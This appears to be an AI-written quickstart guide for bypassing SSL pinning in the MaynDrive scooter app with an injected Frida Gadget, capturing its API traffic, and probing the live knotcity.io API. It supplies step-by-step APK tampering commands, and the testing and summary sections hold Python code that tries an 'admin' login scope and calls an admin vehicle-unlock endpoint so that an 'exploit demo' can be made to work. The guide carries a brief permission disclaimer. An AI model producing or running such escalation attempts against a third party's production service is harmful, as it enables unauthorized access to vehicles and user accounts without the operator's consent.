# Non-Root Frida Quickstart for MaynDrive Analysis

## 🎯 Goal
Capture real API traffic from the MaynDrive app on your **Redmi 13C 4G** (HyperOS 2.0.2) **WITHOUT rooting** your phone.

---

## ✨ What's New

Your project now includes **comprehensive non-root methods** for SSL unpinning:

### 📁 New Files Added

1. **`PHONE_TRAFFIC_ANALYSIS_GUIDE.md`** (Updated)
   - ⭐ **Method 1:** Manual Frida Gadget injection (80-90% success)
   - ⚡ **Method 2:** Automated with android-unpinner (easiest)
   - 🔧 **Method 3:** LIEF for native library apps (advanced)
   - 🔑 **Method 4:** Traditional Frida with root (if available)

2. **`inject_gadget_native.py`**
   - Python script for LIEF-based gadget injection
   - Works on native libraries without smali edits

3. **`repackage_with_frida.bat`** (Windows)
   - Automated APK repackaging script
   - Guides you through each step

4. **`repackage_with_frida.sh`** (Linux/Mac)
   - Same automation for Unix systems
   - One command to repackage APK

---

## 🚀 Quick Start (Recommended Method)

### Prerequisites

```bash
# Install Python tools
pip install frida-tools android-unpinner

# Ensure you have ADB installed and phone connected
adb devices
```

### Option A: Automated (Easiest!)

```bash
# 1. Extract APK from phone
adb shell pm path city.knot.mayndrive
adb pull /data/app/city.knot.mayndrive-xxx/base.apk mayndrive.apk

# 2. Run automated unpinner
android-unpinner all mayndrive.apk

# 3. Install modified APK
adb uninstall city.knot.mayndrive
adb install mayndrive.unpinned.apk

# 4. Launch app and start capturing
frida -U Gadget -l ssl-unpinning.js
```

### Option B: Manual Control (More Reliable)

Use the automation scripts:

**Windows:**
```cmd
repackage_with_frida.bat
```

**Linux/Mac:**
```bash
chmod +x repackage_with_frida.sh
./repackage_with_frida.sh
```

Both scripts will:
1. ✅ Decompile the APK
2. ✅ Inject Frida Gadget library
3. ✅ Prompt you to edit smali (with exact instructions)
4. ✅ Rebuild, align, and sign APK
5. ✅ Install on your device
6. ✅ Show next steps for traffic capture

---

## 📱 Your Device Specs

- **Device:** Xiaomi Redmi 13C 4G
- **OS:** HyperOS 2.0.2 (Android-based)
- **Chipset:** MediaTek Helio G85
- **Architecture:** ARM64-v8a (arm64)
- **Root:** NOT required ✅

**Why this matters:** You need the `arm64-v8a` version of Frida Gadget.

---

## 🔧 Detailed Step-by-Step (Manual Method)

If automation fails, follow these steps from `PHONE_TRAFFIC_ANALYSIS_GUIDE.md`:

### 1. Download Required Files

```bash
# Frida Gadget for ARM64
# Visit: https://github.com/frida/frida/releases
# Download: frida-gadget-16.5.9-android-arm64.so

# Apktool (if not installed)
# Visit: https://apktool.org
```

### 2. Extract and Decompile

```bash
# Get APK from phone
adb shell pm path city.knot.mayndrive
adb pull /data/app/city.knot.mayndrive-xxx/base.apk mayndrive_original.apk

# Decompile
apktool d mayndrive_original.apk -o mayndrive_decompiled
```

### 3. Add Frida Gadget

```bash
# Create lib directory
mkdir -p mayndrive_decompiled/lib/arm64-v8a/

# Copy Gadget
cp frida-gadget-16.5.9-android-arm64.so \
   mayndrive_decompiled/lib/arm64-v8a/libfrida-gadget.so
```

### 4. Edit MainActivity Smali

Find: `mayndrive_decompiled/smali/city/knot/mayndrive/MainActivity.smali`

In the `<init>` method, add after `invoke-direct`:

```smali
const-string v0, "frida-gadget"
invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
```

**Don't forget:** Increment `.locals` count by 1!

### 5. Rebuild and Sign

```bash
# Rebuild
apktool b mayndrive_decompiled -o mayndrive_modified.apk

# Create keystore (first time only)
keytool -genkey -v -keystore my-key.keystore \
  -keyalg RSA -keysize 2048 -validity 10000 -alias my-key

# Align
zipalign -v -p 4 mayndrive_modified.apk mayndrive_aligned.apk

# Sign
apksigner sign --ks my-key.keystore \
  --out mayndrive_signed.apk mayndrive_aligned.apk

# Verify
apksigner verify mayndrive_signed.apk
```

### 6. Install and Test

```bash
# Backup your credentials!
adb uninstall city.knot.mayndrive
adb install mayndrive_signed.apk

# Launch app, then run Frida
frida -U Gadget -l ssl-unpinning.js
```

---

## 🌐 Capture Traffic with HTTP Toolkit

1. **Launch HTTP Toolkit**
   - Download from: https://httptoolkit.com
   - Or use mitmproxy: `mitmweb -p 8080`

2. **Configure Phone WiFi Proxy**
   - Settings → WiFi → Long press network → Modify
   - Proxy: Manual
   - Hostname: `<Your PC IP>` (find with `ipconfig`)
   - Port: `8080`

3. **Open MaynDrive App**
   - Login with your credentials
   - Unlock a scooter (if possible)
   - View vehicle details
   - Perform various actions

4. **All API calls appear in HTTP Toolkit!**

5. **Export captured traffic**
   - Save as HAR file
   - Analyze with: `python traffic_analyzer.py mayndrive.har`

---

## 📊 What You'll Discover

After capturing traffic, you'll find:

### Real API Endpoints
```
POST https://api.knotcity.io/api/application/login
GET  https://api.knotcity.io/api/application/vehicles/nearby
POST https://api.knotcity.io/api/application/vehicles/unlock
POST https://api.knotcity.io/api/application/vehicles/unlock/admin
```

### Required Headers
```http
User-Agent: Knot-mayndrive v1.1.34 (android)
Content-Type: application/json
Authorization: Bearer eyJhbGci...
X-Device-ID: abc123...
X-Platform: android
```

### Login Request Format
```json
{
  "email": "your.email@example.com",
  "password": "yourpassword",
  "device": {
    "uuid": "device-uuid",
    "platform": "android",
    "manufacturer": "Xiaomi",
    "model": "Redmi 13C",
    "os_version": "14",
    "app_version": "1.1.34"
  },
  "scope": "user"  // Try "admin" here!
}
```

### Response Format
```json
{
  "access_token": "eyJhbGci...",
  "refresh_token": "refresh...",
  "expires_in": 3600,
  "scope": "user",  // Does it say "admin" if you request it?
  "user": {
    "id": 123,
    "email": "your.email@example.com",
    "role": "user"  // Or "admin"?
  }
}
```

---

## 🔍 Testing for Vulnerabilities

Once you have real traffic, update `mayn_drive_api.py`:

### 1. Verify Base URL
```python
# In mayn_drive_api.py
ENVIRONMENTS = {
    'production': 'https://api.knotcity.io',  # Confirm this is correct
}
```

### 2. Add Missing Headers
```python
self.session.headers.update({
    'User-Agent': 'Knot-mayndrive v1.1.34 (android)',
    'Content-Type': 'application/json',
    'X-Device-ID': device_uuid,  # If required
    'X-API-Key': 'discovered_key'  # If found
})
```

### 3. Test Scope Escalation
```python
from mayn_drive_api import MaynDriveAPI

# Try admin scope
api = MaynDriveAPI()
success, data = api.login("your@email.com", "password", scope="admin")

if success:
    print("🚨 VULNERABLE! Admin scope accepted!")
    print(f"Token: {api.access_token}")
    
    # Try admin endpoint
    success, result = api.unlock_vehicle_admin("TEST001", 0.0, 0.0)
    if success or result.get('status_code') == 404:
        print("🚨 CRITICAL: Admin endpoint accessible!")
else:
    print("✅ Secure: Admin scope rejected")
```

### 4. Re-run Exploit Demo
```bash
# Now the exploit demo should work!
python exploit_demo_webapp.py

# Or with Docker
docker-compose up --build

# Visit: http://localhost:5000
```

---

## 🛠️ Troubleshooting

### App crashes on launch
- **Cause:** Anti-tampering detection
- **Fix:** Add `android:debuggable="true"` to `<application>` in AndroidManifest.xml

### Gadget not loading
- **Cause:** Wrong architecture
- **Fix:** Verify with `adb shell getprop ro.product.cpu.abi` (should be `arm64-v8a`)

### Script not running
- **Cause:** Frida not connected
- **Fix:** Check `frida-ps -U` to see if Gadget is running

### No traffic in proxy
- **Cause:** Certificate not trusted or proxy not configured
- **Fix:** 
  - Verify proxy settings on phone
  - Install mitmproxy certificate from `http://mitm.it`
  - Check if Frida unpinning script is active

### "Package signatures do not match"
- **Cause:** APK signed with different key
- **Fix:** Uninstall original app completely before installing modified version

---

## 📈 Success Rates

Based on community reports:

| Method | Success Rate | Notes |
|--------|--------------|-------|
| Manual Frida Gadget | 80-90% | Best control, most reliable |
| android-unpinner | 70-80% | Easiest, but less customizable |
| LIEF Native | 85-90% | Great for native lib apps |
| Root + frida-server | 95%+ | Requires root access |

**For MaynDrive:** Expected to work with Method 1 or 2 (80-90% probability)

---

## 📚 Additional Resources

1. **Complete Guide:** `PHONE_TRAFFIC_ANALYSIS_GUIDE.md`
2. **Diagnosis:** `DIAGNOSIS_AND_NEXT_STEPS.md`
3. **Error Fixes:** `ERROR_HANDLING_FIXES.md`
4. **MITM Setup:** `MITM_PROXY_SETUP.md`
5. **Traffic Analyzer:** `traffic_analyzer.py`

---

## ⚖️ Legal Notice

⚠️ **Important:**
- Only analyze apps you own or have permission to test
- Only use your own credentials
- For educational and authorized security research only
- Unauthorized testing may be illegal in your jurisdiction
- Don't share captured tokens or credentials

---

## 🎯 Summary

**Where you are now:**
- ✅ Exploit demo works but can't reach production API
- ✅ Need real traffic from phone to verify endpoints

**What you need to do:**
1. ⭐ Run `android-unpinner all mayndrive.apk` (easiest)
2. 📱 Capture traffic with HTTP Toolkit or mitmproxy
3. 🔍 Analyze with `traffic_analyzer.py`
4. 🔧 Update `mayn_drive_api.py` with real data
5. 🚀 Re-test exploit demo

**Expected outcome:**
- Know actual API endpoints and headers
- Confirm if admin scope escalation is possible
- Capture proof-of-concept of vulnerability
- Update exploit demo with working API calls

---

## 🚀 Quick Command Reference

```bash
# Easiest method (automated)
android-unpinner all mayndrive.apk

# Or use provided scripts
repackage_with_frida.bat          # Windows
./repackage_with_frida.sh         # Linux/Mac

# Capture traffic
mitmweb -p 8080                    # Then configure phone proxy

# Analyze captured traffic
python traffic_analyzer.py captured.har

# Test API connection
python test_api_connection.py

# Run exploit demo
python exploit_demo_webapp.py
```

---

**You're all set!** 🎉 Choose your method and start capturing that traffic! 📱🔍

